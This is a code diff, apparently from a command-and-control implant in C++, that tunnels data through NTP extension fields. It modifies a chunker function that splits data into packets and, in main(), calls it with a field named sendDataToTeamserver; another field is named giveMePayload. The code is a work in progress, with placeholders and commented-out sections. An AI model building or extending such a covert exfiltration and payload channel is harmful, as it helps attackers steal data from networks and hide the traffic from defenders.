@@ -25,10 +25,25 @@ Extension Field Key:
 #include "net.hpp"
 #include <vector>
 
-std::vector<uint8_t> chunker(std::vector<uint8_t> data) {
+std::vector<uint8_t> chunker(std::vector<uint8_t> data, std::array < uint8_t, 2> extensionField) {
 	//1. Calculate size of data, (data.size()), then send a sizePacket to server. If OK, continue
 	size_t dataSize = data.size();
+	
+	////send initial packet with size of total message
+	//auto packet = NTPPacket();
+	//packet.addExtensionField(
+	//	extensionField, //NtpExtensionField::giveMePayload,
+	//	chunkData
+	//);
+
+	//std::vector < uint8_t> packet_bytes = packet.getPacket();
+	////placeholder, should return a vector, of the full NTP packet
+	//std::vector<uint8_t> response = sendChunk(packet_bytes);
+	//
+	
 	std::vector<uint8_t> responseDataBuffer = {};
+
+
 
 
 	//int amountOfChunks = dataSize / Chunk::maxChunkSize;
@@ -50,7 +65,7 @@ std::vector<uint8_t> chunker(std::vector<uint8_t> data) {
 		//creat ntp packet first
 		auto packet = NTPPacket();
 		packet.addExtensionField(
-			NtpExtensionField::giveMePayload,
+			extensionField, //NtpExtensionField::giveMePayload,
 			chunkData
 		);
 		//pass full ntp packet 
@@ -73,8 +88,8 @@ std::vector<uint8_t> chunker(std::vector<uint8_t> data) {
 
 
 	//when done looping, return array
-	std::vector<uint8_t> placehodlerVec = {};
-	return placehodlerVec;
+	//std::vector<uint8_t> placehodlerVec = {};
+	return responseDataBuffer;
 }
 
 
@@ -109,7 +124,7 @@ int main() {
 	//print full packet
 	//packet.printPacket();
 	printHexVectorPacket(packet_bytes);
-	chunker(packet_bytes);
+	chunker(packet_bytes, NtpExtensionField::sendDataToTeamserver);
 
 }
 
